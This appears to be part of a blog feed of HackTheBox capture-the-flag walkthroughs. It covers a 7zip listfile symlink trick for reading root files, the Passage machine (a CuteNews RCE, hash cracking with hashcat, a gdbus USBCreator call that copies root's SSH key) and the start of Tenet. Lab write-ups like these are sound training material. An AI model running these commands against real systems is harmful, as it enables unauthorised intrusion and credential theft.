+&lt;p&gt;Essentially this script will use 7zip to backup the contents of the &lt;code&gt;/var/www/html/uploads&lt;/code&gt; directory. However the command uses a wildcard. We can use this in order to read files we don&amp;rsquo;t have read access for.&lt;/p&gt;
+&lt;p&gt;That is possible because with 7zip we can provide listfiles as arguments like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;7z @myfile
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then 7zip will get the file with the name &lt;code&gt;myfile&lt;/code&gt; and read its content. This file should contain a list of all the files we want to archive. It could look like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;file1.pdf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;secret.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the case where &lt;code&gt;myfile&lt;/code&gt; is a symbolic link to another file, it is the content of that file that is read instead. In our our example, let&amp;rsquo;s say we have &lt;code&gt;myfile&lt;/code&gt; pointing to &lt;code&gt;/root/root.txt&lt;/code&gt;. 7zip will consider the content of &lt;code&gt;/root/root.txt&lt;/code&gt; as a file to archive, but since there are no files with that name, it will cause an error which will be logged in &lt;code&gt;error.log&lt;/code&gt; file, disclosing the content of &lt;code&gt;/root/root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Note that providing directly the symbolic link (without using listfiles) would not work in this case since the command uses the &lt;code&gt;-snl&lt;/code&gt; argument. This will archive the link itself instead of the content of the file that is being pointing at.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/snl_arg.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;-snl argument&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+&lt;/blockquote&gt;
+&lt;p&gt;Another problem is that the &lt;code&gt;error.log&lt;/code&gt; file is cleaned up after each execution. But we can use the &lt;code&gt;tail&lt;/code&gt; command to monitor it for any changes:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;387659412&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;387659412&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Monitoring changes on error.log&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+tail -f error.log
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;So in one terminal we&amp;rsquo;ll create (as the user &lt;code&gt;apache&lt;/code&gt;) two files:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@myfile&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;myfile&lt;/code&gt; which is a link to the file we want to read, in this case &lt;code&gt;/root/root.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/symlink.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Creating necessary files&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;And in the second terminal (as &lt;code&gt;ldapuser&lt;/code&gt;), we monitor the changes on &lt;code&gt;error.log&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;After a few seconds, we get the root flag in the second terminal:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/ctf/root.txt.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root flag obtained!&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>HTB - Passage</title>
+      <link>//localhost:1313/posts/htb-passage/</link>
+      <pubDate>Sun, 27 Apr 2025 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/htb-passage/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;Passage is a medium difficulty Linux machine that hosts a CuteNews web application. This is found to suffer from a remote command execution vulnerability, which is leveraged to gain a foothold. A CuteNews password hash for the application user &lt;code&gt;paul&lt;/code&gt; is discovered and cracked. Owing to password reuse, we can use this to move laterally to the &lt;code&gt;paul&lt;/code&gt; system user. A private SSH key is found to be shared between the system users, which allows us to move laterally to &lt;code&gt;nadav&lt;/code&gt;. This user is found to be a member of the sudo group. Enumeration of the vim command line history reveals that the &lt;code&gt;com.ubuntu.USBCreator.conf&lt;/code&gt; policy has been edited, in order to allow users of the &lt;code&gt;sudo&lt;/code&gt; group to invoke methods of the &lt;code&gt;usb-creator&lt;/code&gt; service. The D-Bus service USBCreator is found to suffer from a vulnerability, allowing the password security policy imposed by &lt;code&gt;sudo&lt;/code&gt; binary to be bypassed. This is leveraged in order to read privileged files as root.&lt;/p&gt;</description>
+      <content>&lt;blockquote&gt;
+&lt;p&gt;Passage is a medium difficulty Linux machine that hosts a CuteNews web application. This is found to suffer from a remote command execution vulnerability, which is leveraged to gain a foothold. A CuteNews password hash for the application user &lt;code&gt;paul&lt;/code&gt; is discovered and cracked. Owing to password reuse, we can use this to move laterally to the &lt;code&gt;paul&lt;/code&gt; system user. A private SSH key is found to be shared between the system users, which allows us to move laterally to &lt;code&gt;nadav&lt;/code&gt;. This user is found to be a member of the sudo group. Enumeration of the vim command line history reveals that the &lt;code&gt;com.ubuntu.USBCreator.conf&lt;/code&gt; policy has been edited, in order to allow users of the &lt;code&gt;sudo&lt;/code&gt; group to invoke methods of the &lt;code&gt;usb-creator&lt;/code&gt; service. The D-Bus service USBCreator is found to suffer from a vulnerability, allowing the password security policy imposed by &lt;code&gt;sudo&lt;/code&gt; binary to be bypassed. This is leveraged in order to read privileged files as root.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;port-scan-results&#34;&gt;Port Scan Results&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;From the results of the nmap scan, we see that we have 2 ports open: 22 and 80&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Passage News
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;website&#34;&gt;Website&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;recon&#34;&gt;Recon&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Navigating to &lt;code&gt;http://10.10.10.226&lt;/code&gt;, we get this page:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/homepage.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Home Page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;At the bottom of the passage we can see that it is running &lt;a href=&#34;https://cutephp.com/&#34;&gt;&amp;ldquo;CuteNews&amp;rdquo;&lt;/a&gt;&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/pwd_by.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Powered by CuteNews&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Hovering over some of the author names, we can see that they point to some email addresses revealing potential usernames and the domain name of the box:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/nadav_mail.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Nadav&#39;s email&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/paul_mail.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Paul&#39;s email&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s note the usernames somewhere and add &lt;code&gt;passage.htb&lt;/code&gt; to our hosts file.&lt;/p&gt;
+&lt;p&gt;After examining the page source carefully, we find the &lt;code&gt;/CuteNews&lt;/code&gt; endpoint containing a login page which also discloses the version of CuteNews which is &lt;code&gt;2.1.2&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/cn_version.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Login page disclosing CuteNews version&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Googling &amp;lsquo;CuteNews 2.1.2 exploit&amp;rsquo;, we find this &lt;a href=&#34;https://www.exploit-db.com/exploits/48800&#34;&gt;POC&lt;/a&gt; for &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2019-11447&#34;&gt;CVE-2019-11447&lt;/a&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/rce_poc.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Running CuteNews RCE exploit POC&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After running it, we get a shell as &lt;code&gt;www-data&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/www-data-shell.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Shell as www-data&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h2 id=&#34;privesc&#34;&gt;Privesc&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;www-data---paul&#34;&gt;www-data -&amp;gt; paul&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;In &lt;code&gt;/var/www/html/CuteNews/cdata/users&lt;/code&gt;, we can find different php files, which we can assume correspond to the data of the each user of the site.&lt;/p&gt;
+&lt;p&gt;
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/users_b64.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Users data files&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;img src=&#34;//localhost:1313/assets/img/htb/passage/users_b64.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The file &lt;code&gt;lines&lt;/code&gt; contains all of the user data in base64 format. Using the following command, we can filter the base64 data and decode it:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;762391458&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;762391458&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Decoding users data&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+for line in `cat lines | grep -v &amp;#34;access denied&amp;#34;`; do printf &amp;#34;\n&amp;#34;;echo $line | base64 -d; printf &amp;#34;\n&amp;#34;; done
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We get the password hashes of some users:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/pass_hash_users.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Password hashes&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sid-meier:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;paul-coles:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kim-swift:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can try to crack them with hashcat:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;895276314&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;895276314&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Cracking hashes&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+hashcat -m 1400 hashes /usr/share/wordlists/rockyou.txt --username
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Only &lt;code&gt;paul&lt;/code&gt;&amp;rsquo;s hash was cracked:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/nadav_hash.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Paul&#39;s password cracked!&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Using this password we can switch to &lt;code&gt;paul&lt;/code&gt; and retrieve the user flag:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/user.txt.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;User flag obtained!&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;blockquote&gt;
+&lt;p&gt;We could not log in via ssh with a password&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/paul_ssh_login.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Cannot login with password&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;paul---nadav&#34;&gt;paul -&amp;gt; nadav&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Trying to get &lt;code&gt;paul&lt;/code&gt;&amp;rsquo;s ssh key in order to login via ssh, we notice that his key pair is tied to &lt;code&gt;nadav&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/paul_ssh_key.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Paul&#39;s ssh key shared with nadav&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Using the corresponding private key, we were able to login as nadav:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/nadav_shell.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Shell as nadav&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;nadav---root&#34;&gt;nadav -&amp;gt; root&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;In the &lt;code&gt;.viminfo&lt;/code&gt; file, we can see that &lt;code&gt;nadav&lt;/code&gt; edited &lt;code&gt;/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf&lt;/code&gt;&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/nadav_viminfo.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Nadav&#39;s .viminfo history&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;And in the command line history, we can see that they edited the &lt;code&gt;AdminIdentities&lt;/code&gt; from the root group to the sudo group.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/viminfo_cmdline_history.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Nadav&#39;s vim command history&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After some research about the USBCreator D-Bus interface, we find &lt;a href=&#34;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&#34;&gt;this article&lt;/a&gt; describing a vulnerability allowing an attacker with access to  the sudoer group to bypass the password security policy imposed by the sudo program, essentially getting root privileges.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;com.ubuntu.USBCreator&lt;/code&gt; service is found to contain an implementation of the &lt;code&gt;dd&lt;/code&gt; command, allowing us to copy files between locations. This allows a user to overwrite arbitrary files on the filesystem, as root, with no password prompting.&lt;/p&gt;
+&lt;p&gt;For example we can copy the private ssh key of the root user as follows:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;245798163&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;245798163&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Copying root&amp;rsquo;s private ssh key&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/root_idrsa.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root&#39;s private ssh key&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;With this key, we can log in as root and retrieve the root flag.&lt;/p&gt;
+&lt;p&gt;
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/passage/root.txt.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;img src=&#34;//localhost:1313/assets/img/htb/passage/root.txt.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HTB - Tenet</title>
+      <link>//localhost:1313/posts/htb-tenet/</link>
+      <pubDate>Sun, 27 Apr 2025 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/htb-tenet/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it&amp;rsquo;s backup. It is possible after identificaiton of the backup file to review its source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user &lt;code&gt;www-data&lt;/code&gt; to user &lt;code&gt;Neil&lt;/code&gt;. Further system enumeration reveals that this user have root permissions to run a bash script through &lt;code&gt;sudo&lt;/code&gt;. The script is writing SSH public keys to the &lt;code&gt;authorized_keys&lt;/code&gt; file of the &lt;code&gt;root&lt;/code&gt; user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the &lt;code&gt;authorized_keys&lt;/code&gt; file and use them to login to the system as &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;</description>
+      <content>&lt;blockquote&gt;
+&lt;p&gt;Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it&amp;rsquo;s backup. It is possible after identificaiton of the backup file to review its source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user &lt;code&gt;www-data&lt;/code&gt; to user &lt;code&gt;Neil&lt;/code&gt;. Further system enumeration reveals that this user have root permissions to run a bash script through &lt;code&gt;sudo&lt;/code&gt;. The script is writing SSH public keys to the &lt;code&gt;authorized_keys&lt;/code&gt; file of the &lt;code&gt;root&lt;/code&gt; user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the &lt;code&gt;authorized_keys&lt;/code&gt; file and use them to login to the system as &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;port-scan-results&#34;&gt;Port Scan Results&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;From the results of the nmap scan, we see that we have 2 ports open: 22 and 80&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
